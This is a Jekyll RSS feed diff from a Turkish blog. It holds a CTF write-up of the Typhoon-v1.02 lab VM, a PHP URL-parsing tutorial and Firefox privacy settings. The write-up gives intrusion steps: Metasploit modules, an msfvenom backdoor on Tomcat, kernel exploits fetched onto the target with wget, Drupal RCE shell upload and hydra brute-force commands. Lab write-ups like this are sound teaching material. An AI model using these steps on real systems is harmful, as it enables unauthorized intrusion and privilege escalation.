@@ -1,0 +1,490 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Posts</title>
+    <description>My Personal Posts</description>
+    <link>http://localhost:4000/</link>
+    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
+    <pubDate>Sun, 28 Jul 2019 19:12:53 +0300</pubDate>
+    <lastBuildDate>Sun, 28 Jul 2019 19:12:53 +0300</lastBuildDate>
+    <generator>Jekyll v3.8.5</generator>
+    
+      <item>
+        <title>Typhoon-v1.02 WRITEUP</title>
+        <description>&lt;p&gt;&lt;em&gt;**Hazırlayanlar: &lt;a href=&quot;https://github.com/isikerenalp&quot;&gt;Alp Eren Işık&lt;/a&gt; &amp;amp; &lt;a href=&quot;https://github.com/Fykarababa&quot;&gt;Feyzi Yuşa Karababa&lt;/a&gt; **&lt;/em&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;PRISMA CSI tarafından hazırlanan Typhoon-v1.02 makinesini elimizden geldiği kadar çözmeye çalıştık ve sizler için ufak bir writeup hazırladık. Biz çözerken çok zevk aldık umarım sizler içinde zevkli bir writeup olur.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;nmap&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;NMAP&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;İlk aşamada Nmap ile port taraması yaparak çalışan servisleri ve versiyonları öğrendik.
+  Devamında bu servisler ve versiyonları üzerinden mevcut exploitleri araştıracağız.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/nmap.png&quot; alt=&quot;nmap&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;apache-tomcat&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Apache Tomcat&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;Metasploit kullanarak &lt;strong&gt;use auxiliary/scanner/http/tomcat_mgr_login&lt;/strong&gt; scanner kullanarak tomcat parolasını bulmaya çalışıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/msf1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Aşşağıda gördüğünüz gibi tomcat username ve password bulmuş oluyoruz&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/msf2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Daha sonra &lt;strong&gt;10.242.24.216:8080/manager&lt;/strong&gt; adresine giderek bulmuş olduğumuz &lt;strong&gt;username&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;(tomcat)&lt;/code&gt; ve &lt;strong&gt;password&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;(tomcat)&lt;/code&gt; ile giriş yapıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/tomcat_tomcat.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Giriş yaptıktan sonra tekrar Metasploitimize geri dönüyoruz ve &lt;strong&gt;msfvenom&lt;/strong&gt; ile backdoor oluşturuyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/msf3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Daha sonra oluşturmuş olduğumuz bu backdooru girmiş olduğumuz &lt;strong&gt;tomcat&lt;/strong&gt; üzerinden &lt;strong&gt;deploy&lt;/strong&gt; ediyoruz&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/tomcat_deploy.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Deploy ettikten sonra tekrar Metasploitimize gelerek &lt;code class=&quot;highlighter-rouge&quot;&gt;use exploit/multi/handler&lt;/code&gt; yazıyoruz daha sonra modülümüze bağlanacağımız backdoor payloadımızı ve bilgilerimizi giriyoruz.&lt;/p&gt;
+
+&lt;p&gt;Artık tarayıcımızdan &lt;code class=&quot;highlighter-rouge&quot;&gt;10.242.24.216:8080/manager/typhoon/lyrzruiw.jsp&lt;/code&gt; adresine girebiliriz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/msf4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/tomcat_backdoor.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu aşamadan sonra sunucuda &lt;strong&gt;ROOT&lt;/strong&gt; olmaya çalışacağız.&lt;/p&gt;
+
+&lt;h1 id=&quot;yetki-yükseltme---1-dirtycow&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Yetki Yükseltme - 1 (dirtycow)&lt;/code&gt;&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.exploit-db.com/exploits/40616   Backconnect olduğumuz makinemizde **C** kodunu derleyemediğimiz için derleme işlemini uzak sunucuda gerçekleştirmeye karar verdik.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Uzak sunucumuzda &lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://www.exploit-db.com/raw/40616/index.html&lt;/code&gt; ile komutları çektik ve uzak sunucumuzda bunu derledik. Daha sonra Typhoon makinesinde &lt;code class=&quot;highlighter-rouge&quot;&gt;wget https://sunucu_adresi/prisma&lt;/code&gt; diyerek derlenmiş &lt;strong&gt;C&lt;/strong&gt; kodunu makinemize yüklemiş olduk. Derleyip wget ile çekmiş olduğumuz exploitimizi makinemizde çalıştırdık ve &lt;strong&gt;ROOT&lt;/strong&gt; olduk. Son olarak &lt;code class=&quot;highlighter-rouge&quot;&gt;echo 0 &amp;gt; /proc/sys/vm/dirty_writeback_centisecs&lt;/code&gt; komutunu girerek exploitimizin stabil olmasını sağlayarak sunucunun crash olmasını engelliyoruz. :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/msf5_dirtycow.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;yetki-yükseltme---2-ubuntu-kernel-exploit&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Yetki Yükseltme - 2 (Ubuntu Kernel Exploit)&lt;/code&gt;&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://www.exploit-db.com/exploits/37292/ Yukarıda anlatmış olduğumuz işlemleri bu exploitimiz ile de uygulayarak `wget https://sunucu_adresi/ubn` ile çekmiş olduğumuz exploitimizi makinemizde çalıştırarak  **ROOT** oluyoruz. :)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/msf5_ubuntu_exploit.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;samba-smbd-3x---4x-root&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Samba smbd 3.X - 4.X (ROOT)&lt;/code&gt;&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Github Code = https://github.com/rapid7/metasploit-framework/blob/0520d7cf76f8e5e654cb60f157772200c1b9e230/modules/exploits/linux/samba/is_known_pipename.rb
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Çalışan versiyonda bir exploit olduğunu öğrendik. Githubda bulduğumuz kodu &lt;code class=&quot;highlighter-rouge&quot;&gt;wget&lt;/code&gt; ile &lt;strong&gt;/opt/metasploit/modules/exploits/linux/samba/&lt;/strong&gt; dizini altına &lt;strong&gt;is_known_pipename.rb&lt;/strong&gt; ismiyle kaydettik. Daha sonra metasploit üzerinden exploiti kullanarak makinemizde &lt;strong&gt;ROOT&lt;/strong&gt; olduk. :)&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/samba.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;NOT: Eğer bu aşamadan sonra root olmaz ise devamında dirtycow ile rootlayabilirsiniz.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;phpmyadmin-username--password&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Phpmyadmin Username &amp;amp;&amp;amp; Password&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;Sunucumzuda root olduktan sonra içeriye bir de shell atalım dedik. Shellimizden dizinleri ve dosyaları gezerken &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/dvwa/config/config.inc.php&lt;/code&gt; dosyası içerisinde &lt;strong&gt;phpmyadmin&lt;/strong&gt; kullanıcı adı ve parolasını bulduk.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/phpmyadmin1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/phpmyadmin2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/phpmyadmin3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;kullanıcı-adı-ve-parolası&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Kullanıcı Adı ve Parolası&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;Shellimizi attıktan sonra bir de mongoadmin dikkatimizi çekti ve biz de  &lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.43.114/mongoadmin/&lt;/code&gt; adresine gittik.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;credentials&lt;/strong&gt; Bir değişiklik yapmadan bu şekilde aratıyoruz.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/mongoadmin1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;creds (2)&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/mongoadmin2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Kullanıcı adı ve parolasını öğrenmiş olduk.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/mongoadmin3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;URL= &lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.43.114/mongoadmin/index.php?db=credentials&amp;amp;action=listRows&amp;amp;collection=creds&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Username&lt;/strong&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;typhoon&lt;/code&gt; &amp;amp;&amp;amp; &lt;strong&gt;Password&lt;/strong&gt; : &lt;code class=&quot;highlighter-rouge&quot;&gt;789456123&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/login.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;postgresql-db-933---935-exploit-ile-dosya-okuma&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;PostgreSQL DB 9.3.3 - 9.3.5 Exploit ile Dosya Okuma&lt;/code&gt;&lt;/h1&gt;
+&lt;p&gt;Çalışan PostgreSQL sürümünde dosyaları okumamıza imkan sağlayan bir exploit olduğunu farkettik. ve  Metasploitimiz ile işe koyulmaya başladık :)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;auxiliary/admin/postgres/postgres_readfile
+
+Not: 'exploit' yerine 'set RFILE ../okunacak_dosya' komutu ile dosyaları okuyabilirsiniz
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/postgresql_read-file.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;drupal-8-rce&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Drupal-8 RCE&lt;/code&gt;&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;view-source:http://192.168.1.60/drupal diyerek drupalın sürümünün 8 olduğunu öğrendikten sonra aklımıza Drupal-8 de bulunan RCE geldi.&lt;/p&gt;
+
+&lt;p&gt;Drupal RCE CVE-2018-7600 : https://www.exploit-db.com/exploits/44448/&lt;/p&gt;
+
+&lt;hr /&gt;
+&lt;p&gt;Drupalın &lt;strong&gt;register&lt;/strong&gt; bölümünde mevcut olan &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; zaafiyeti.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/drupal.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bunun dışında şöyle bir yöntem izlenebilir , drupalın default olarak config dosyası &lt;strong&gt;sites/default/settings.php&lt;/strong&gt; de bulunmakta. Bunu &lt;code class=&quot;highlighter-rouge&quot;&gt;RCE&lt;/code&gt; açığı ile okuyup database username ve password bilgileri alınıp phpmyadmine giriş yapılabilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/drupal2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;NOT:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;Post olarak gönderdiğimizde ilk olarak shell atmaya çalıştık fakat drupalın dizininde yazma izni yoktu. Ardından pwd komutu ile bulunduğu dizini öğrendik. Sonra var/www/html dizininde yazma izni olduğunu gördük ve shellimizi yükledik. :)&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;lotuscms-rce-exploit&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;LotusCMS RCE Exploit&lt;/code&gt;&lt;/h1&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;use exploit/multi/http/lcms_php_exec
+https://www.exploit-db.com/exploits/18565/   Sistemin kullandığı CMS yazılımının LotusCMS olduğunu öğrendik ve google'da kısa bir araştırma yaptıktan sonra **RCE** exploitinin olduğunu gördük. Daha sonra kullanacağımız exploiti ve bilgilerimizi girdikten sonra `exploit` diyerek çalıştırıyoruz.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/lotuscms.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;brute-force-ile-parola-tespiti&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Brute Force ile Parola Tespiti&lt;/code&gt;&lt;/h1&gt;
+&lt;hr /&gt;
+&lt;p&gt;Burada Hydra ile &lt;strong&gt;SSH&lt;/strong&gt; ve &lt;strong&gt;FTP&lt;/strong&gt; ‘ye brute force yaparak parolayı bulduk.&lt;/p&gt;
+
+&lt;p&gt;hydra -t 1 -l typhoon -P /home/fkarababa/Masaüstü/pass.txt -vV 192.168.1.60 ssh&lt;/p&gt;
+
+&lt;p&gt;hydra -t 1 -l typhoon -P /home/fkarababa/Masaüstü/pass.txt -vV 192.168.1.60 ftp
+***
+&lt;code class=&quot;highlighter-rouge&quot;&gt;SSH&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/hydra-ssh.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FTP&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/static/img/posts/typhoon-v1/hydra_ftp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Sun, 28 Oct 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/2018/10/28/typhoon.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/10/28/typhoon.html</guid>
+        
+        
+        <category>writeup</category>
+        
+      </item>
+    
+      <item>
+        <title>PHP URL Ayrıştırmak (URL Parse Etmek)</title>
+        <description>&lt;hr /&gt;
+
+&lt;h1 id=&quot;parse_url&quot;&gt;parse_url()&lt;/h1&gt;
+&lt;p&gt;parse_url fonksiyonu PHP4 ve üstü sürümlerde desteklenmektedir. Bu fonksiyon ile istediğimiz URL’i parçalara ayırmamız mümkün. Ayrıca bu fonksiyon bir URL doğrulayıcı olarak kullanılmamalıdır. Yaptığı sadece URL’i birazdan belirteceğim parçalara ayırmaktır.&lt;/p&gt;
+
+&lt;h1 id=&quot;bileşenler&quot;&gt;Bileşenler&lt;/h1&gt;
+&lt;p&gt;Belirli bir URL bileşenini dizge olarak döndürmek isterseniz şu sabitlerden birini kullanabilirsiniz. =&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_SCHEME&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_HOST&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_PORT&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_USER&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_PASS&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_PATH&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_QUERY&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;PHP_URL_FRAGMENT&lt;/code&gt; .&lt;/p&gt;
+
+&lt;h1 id=&quot;dönen-değerler&quot;&gt;Dönen Değerler&lt;/h1&gt;
+&lt;p&gt;NOT: Bozulmuş URL’lerde parse_url() &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; döndürebilir ve &lt;code class=&quot;highlighter-rouge&quot;&gt;E_WARNING&lt;/code&gt; çıktısı verebilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;scheme&lt;/code&gt; = http://&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;host&lt;/code&gt; = konak ismi&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;port&lt;/code&gt; = port&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt; = kullanıcı&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pass&lt;/code&gt; = parola&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;path&lt;/code&gt; = dosya yolu&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;query&lt;/code&gt; = sorgu / ?’den sonra&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fragment&lt;/code&gt; = örgü / #’den sonra&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Örnek 1-)
+  &amp;lt;?php
+    $url = 'http://username:password@hostname/path?arg=value#anchor';
+    /* print_r() fonksiyonu bir dizinin içeriğini yazdırmak için kullanılır*/
+      print_r(parse_url($url));
+        echo parse_url($url, PHP_URL_PATH);
+  ?&amp;gt;
+  // Çıktısı
+    Array
+  (
+    [scheme] =&amp;gt; http
+    [host] =&amp;gt; hostname
+    [user] =&amp;gt; username
+    [pass] =&amp;gt; password
+    [path] =&amp;gt; /path
+    [query] =&amp;gt; arg=value
+    [fragment] =&amp;gt; anchor
+  )
+    /path
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;#&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  Örnek 2-)
+  &amp;lt;?php
+    $url = 'https://www.youtube.com/watch?v=IQaXTd8Ljg4';
+      $arr = parse_url($url);
+        print_r($arr);
+  ?&amp;gt;
+  //Çıktı
+    Array
+  (
+    [scheme] =&amp;gt; https
+    [host] =&amp;gt; www.youtube.com
+    [path] =&amp;gt; /watch
+    [query] =&amp;gt; v=IQaXTd8Ljg4
+  )
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;parse_str&quot;&gt;parse_str()&lt;/h1&gt;
+&lt;p&gt;parse_str() fonksiyonu, bir sorgu dizesini değişkenlere ayrıştırır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Örnek 1-)
+&amp;lt;?php
+  parse_str(&quot;name=AlpEren&amp;amp;age=20&quot;);
+    echo $name.&quot;&amp;lt;br&amp;gt;&quot;;
+      echo $age;
+?&amp;gt;
+// Çıktı
+AlpEren
+20
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;#&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Örnek 2-)
+&amp;lt;?php
+  parse_str(&quot;name=AlpEren&amp;amp;age=20&quot;,$myArray);
+    print_r($myArray);
+      print_r($myArray['name']);
+        echo&quot;\n&quot;;
+          echo $myArray['age'];
+?&amp;gt;
+// Çıktı
+      Array
+    (
+        [name] =&amp;gt; AlpEren
+        [age] =&amp;gt; 20
+    )
+    AlpEren
+    20                                                                             
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;parse_url--parse_str-örnekleri&quot;&gt;parse_url &amp;amp;&amp;amp; parse_str Örnekleri&lt;/h1&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Örnek 1-)
+&amp;lt;?php  
+  $url = 'https://www.youtube.com/results?search_query=PauSiber';    
+    $parts = parse_url($url);  
+      $query = array();  
+        parse_str($parts['query'], $query);  
+          echo &quot;v= &quot;. $query['search_query'];  
+          ?&amp;gt;
+// (Sadece Query değerini almış olduk)
+// Çıktı
+v= PauSiber           
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;#&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Örnek 2-)
+&amp;lt;?php  
+  $url = 'https://ders.im/?q=ders.im&amp;amp;hPP=6&amp;amp;idx=documents&amp;amp;p=0';    
+    $parts = parse_url($url);  
+      $query = array();  
+        parse_str($parts['query'], $query);  
+          echo &quot;v= &quot;. $query['q'];  
+          ?&amp;gt;
+  // Çıktı
+        v= ders.im
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</description>
+        <pubDate>Tue, 24 Jul 2018 00:00:00 +0300</pubDate>
+        <link>http://localhost:4000/2018/07/24/php_url_parse_etmek.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2018/07/24/php_url_parse_etmek.html</guid>
+        
+        
+        <category>PHP</category>
+        
+      </item>
+    
+      <item>
+        <title>Mozilla Firefox Gizlilik ve Güvenlik Ayarları!</title>
+        <description>&lt;hr /&gt;
+
+&lt;p&gt;Yapacaklarımız sadece tarayıcımızda güvenlik önlemleri almak içindir , anlatılanlar 100% gizlilik ve güvenliğinizi sağlamayacaktır.
+  Değişiklik yaptığımız bazı ayarlar web sitelerinin bazı fonksiyonlarının çalışmasını engelleyebilir. Bu yüzden başlangıç olarak yaptığınız değişiklikleri not almanızı öneririm. Yazının sonunda paylaşmış olduğum “Privacy Settings” eklentisi ile ilerde ayarlarınızı hızlıca değiştirebilirsiniz.
+  Adres satırına “about:config” yazarak çıkan uyarıyı onayladıktan sonra ayar sayfamıza gelmiş olacağız.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;beacon.enabled&lt;/code&gt; = Sayfalardan ayrılırken sunuculara veri gönderir. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde bu özellik devre dışı bırakılmış olacaktır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.cache.disk.enable&lt;/code&gt; = Önbelleğin diske kayıt yapıp yapmamasını tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;(Cache Kapatmak)&lt;/code&gt;. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde disk önbelleğe kayıt yapmaz ve disk önbellek kullanılmaz.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.cache.disk.capacity&lt;/code&gt; = Cache açıksa Firefox’un disk önbelleği için kullandığı maksimum alanı belirler. Default değeri &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt; olarak değiştirilebilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.cache.offline.enable&lt;/code&gt; = Web uygulamaları ve sitelerin , yerel sistemde bir çevrimdışı önbellek kullanıp kullanamayacağını belirler. &lt;code class=&quot;highlighter-rouge&quot;&gt;(Offline Cache Kapatmak)&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde çevrimdışı önbellek devre dışı bırakılmış olacak.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.cache.offline.capacity&lt;/code&gt; = Çevrimdışı önbellek kapasitesini belirler.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.formfill.enable&lt;/code&gt; = Web formlarına girilen metinleri kaydedeceğini tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde veriler kaydedilmez.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;places.history.enabled&lt;/code&gt; = Ziyaret edilen sayfaları hatırlayıp hatırlamamasını tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirildiğinde sayfalar kaydedilmeyecektir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.privatebrowsing.autostart&lt;/code&gt; = Firefox’un başlangıçta gizli tarama modunda başlatılıp başlatılmayacağını tanımmlar.  &lt;code class=&quot;highlighter-rouge&quot;&gt;True&lt;/code&gt; olarak değiştirildiğinde gizli tarama modu otomatik olarak kullanılacaktır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.safebrowsing.malware.enabled&lt;/code&gt; = İndirilen dosyaları veritabanında kötü amaçlı yazılım olup olmadığını tarar. İsteğe göre &lt;code class=&quot;highlighter-rouge&quot;&gt;FALSE&lt;/code&gt; olarak değiştirilebilir.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.search.suggest.enabled&lt;/code&gt; = Arama önerilerini görüntülemeyi tanımlar. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirdiğimizde arama önerileri devre dışı olacaktır.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;browser.send_pings&lt;/code&gt; = Sunucuları tıklanan bağlantılar hakkında bilgilendirir. &lt;code class=&quot;highlighter-rouge&quot;&gt;False&lt;/code&gt; olarak değiştirilmesi önerilir.&lt;/p&gt;
+
